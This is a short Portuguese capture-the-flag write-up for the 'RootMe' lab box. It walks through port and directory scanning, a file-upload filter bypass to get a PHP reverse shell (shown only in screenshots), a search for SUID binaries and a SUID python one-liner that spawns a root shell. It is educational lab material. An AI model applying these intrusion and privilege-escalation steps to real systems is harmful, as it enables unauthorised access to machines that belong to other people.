# RootMe

* ### Scan de portas - Verificando quais portas estão abertas.

```bash
rustscan -a 10.10.23.19
```
![image](https://github.com/lufffe/Writeups/assets/90646635/02e989a8-8d16-49d2-8544-9be23e06e14a)

![image](https://github.com/lufffe/Writeups/assets/90646635/7dab900c-5baf-4f2d-b8c3-5bbffe322de8)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 22,80 10.10.23.19
```
![image](https://github.com/lufffe/Writeups/assets/90646635/18e91927-7424-48a8-8880-82511acf2b74)

* ###  Scan de Arquivos e Diretórios.
```bash
gobuster dir -u http://10.10.23.19 -w ~/common.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/ea2b03ef-3d9d-4407-9b54-877e5e678fc7)

* ###  Verificando o diretório /panel/
![image](https://github.com/lufffe/Writeups/assets/90646635/1f03e0b8-3de8-4f74-bb25-d5259aa2b2bb)

* ###  Tentando subir uma reverse shell php, da esse erro.
![image](https://github.com/lufffe/Writeups/assets/90646635/cca860d2-18d6-4b13-996b-1098e2ef01a3)

* ###  HTML5 foi.
![image](https://github.com/lufffe/Writeups/assets/90646635/09751ea6-a148-4d7c-8862-d494558a111f)

* ###  Pegando a shell.
![image](https://github.com/lufffe/Writeups/assets/90646635/464b15b2-ed83-4dd2-a133-d954902b4908)

* ###  Pegando a shell.
![image](https://github.com/lufffe/Writeups/assets/90646635/ccb0a90f-0a0b-41a6-a085-32fdcb7f7638)

![image](https://github.com/lufffe/Writeups/assets/90646635/d43c297e-77cd-4114-8c75-90655ef83052)

![image](https://github.com/lufffe/Writeups/assets/90646635/bfdfd687-2f26-48f2-9cba-bf49f4f1c088)

* ###  Flag User.
```bash
$ find / | grep "user.txt" 2>/dev/null
```
/var/www/user.txt

* ###  Arquivos com permissão de root.
```bash
$ find / -perm -u=s -type f 2>/dev/null
```
![image](https://github.com/lufffe/Writeups/assets/90646635/414cd4da-2142-4332-9ad7-6ba658ac3602)

* ###  ...
![image](https://github.com/lufffe/Writeups/assets/90646635/9158464f-5056-485e-bb41-41bffb0c268e)

![image](https://github.com/lufffe/Writeups/assets/90646635/30f42ff9-813b-4996-bc85-fe14512dbd3c)

* ###  Pegando permissão de root.
```bash
$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
![image](https://github.com/lufffe/Writeups/assets/90646635/5063c930-1c46-4eec-a8bc-21bf5c7b5229)

* ###  Flag Root.
```bash
cat /root/root.txt
```
